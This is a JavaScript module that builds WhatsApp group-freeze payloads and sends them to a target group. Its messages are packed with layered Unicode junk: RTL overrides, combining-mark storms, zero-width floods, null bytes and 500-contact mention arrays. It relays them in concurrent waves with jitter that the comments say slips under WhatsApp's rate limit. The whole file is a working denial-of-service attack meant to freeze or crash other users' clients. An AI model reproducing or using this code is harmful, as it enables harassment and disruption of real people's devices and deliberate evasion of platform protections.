const crypto = require("crypto");

// ── POISON ENGINE ──────────────────────────────────────────────────────────
// Layered unicode: RTL override → Javanese combining storm → Cyrillic millions
// → grapheme joiners → zero-width flood → replacement chars → null-adjacent
function poison(len = 300) {
  const layers = [
    "\u202E",                                          // RTL override — flips render direction
    "ꦿ".repeat(len),                                  // Javanese combining mark × len
    "\u0489".repeat(Math.ceil(len / 2)),              // Cyrillic combining millions sign
    "\u034F".repeat(Math.ceil(len / 2)),              // combining grapheme joiner
    "\u200B".repeat(len),                             // zero-width space flood
    "\u200C".repeat(Math.ceil(len / 2)),              // zero-width non-joiner
    "\u200D".repeat(Math.ceil(len / 2)),              // zero-width joiner
    "\uFFFD".repeat(Math.ceil(len / 4)),              // replacement char
    "\u0000".repeat(Math.ceil(len / 8)),              // null bytes — parser boundary confusion
    "\uDB40\uDC00".repeat(Math.ceil(len / 8)),        // tag block surrogate pair — undefined glyph
  ];
  return layers.join("");
}

// randomised delay 40–140 ms — slips under WhatsApp's 150 ms rate-limit window
function jitter() {
  return 40 + Math.floor(Math.random() * 100);
}

// ── PAYLOAD FACTORIES ──────────────────────────────────────────────────────

// 1. listMessage — 25 sections × 60 rows = 1500 nodes
//    listType 2 (SINGLE_SELECT) forces full eager render of every row
function buildList() {
  const sections = Array.from({ length: 25 }, (_, s) => ({
    title: poison(200),
    rows:  Array.from({ length: 60 }, (_, r) => ({
      title:       poison(120),
      description: poison(200),
      rowId:       `${crypto.randomBytes(12).toString("hex")}_${s}_${r}`
    }))
  }));

  return {
    listMessage: {
      title:       poison(1024),
      description: poison(2048),
      buttonText:  poison(128),
      footerText:  poison(512),
      listType:    2,
      sections
    }
  };
}

// 2. extendedTextMessage — malformed context + deep mention array
//    mention JID list forces the client to resolve 500 contacts simultaneously
function buildText() {
  const mentionedJid = Array.from({ length: 500 }, () =>
    `${crypto.randomBytes(5).toString("hex")}@s.whatsapp.net`
  );

  return {
    extendedTextMessage: {
      text:              poison(4096),
      title:             poison(512),
      description:       poison(512),
      canonicalUrl:      "https://" + poison(256) + ".invalid",
      matchedText:       poison(512),
      jpegThumbnail:     Buffer.alloc(9216, 0xfe),
      mentionedJid,
      contextInfo: {
        mentionedJid,
        quotedMessage: {
          extendedTextMessage: {
            text:        poison(4096),
            mentionedJid
          }
        },
        remoteJid:   `${crypto.randomBytes(5).toString("hex")}@s.whatsapp.net`,
        participant: `${crypto.randomBytes(5).toString("hex")}@s.whatsapp.net`,
      }
    }
  };
}

// 3. buttonsMessage — 10 buttons × poisoned fields
//    button renderer is a separate UI component — third concurrent codepath
function buildButtons() {
  return {
    buttonsMessage: {
      contentText:  poison(2048),
      footerText:   poison(512),
      headerType:   1,
      buttons: Array.from({ length: 10 }, (_, i) => ({
        buttonId:   crypto.randomBytes(8).toString("hex"),
        buttonText: { displayText: poison(256) },
        type:       1
      }))
    }
  };
}

// ── CORE ───────────────────────────────────────────────────────────────────
async function groupFreeze(sock, groupJid, rounds = 8) {
  for (let i = 0; i < rounds; i++) {
    // 3 payload types × 8 concurrent relays = 24 simultaneous socket writes per round
    const wave = [
      ...Array.from({ length: 8 }, () =>
        sock.relayMessage(groupJid, buildList(),    {}).catch(() => {})
      ),
      ...Array.from({ length: 8 }, () =>
        sock.relayMessage(groupJid, buildText(),    {}).catch(() => {})
      ),
      ...Array.from({ length: 8 }, () =>
        sock.relayMessage(groupJid, buildButtons(), {}).catch(() => {})
      ),
    ];

    await Promise.allSettled(wave);
    await new Promise((r) => setTimeout(r, jitter()));
  }
}

module.exports = { groupFreeze };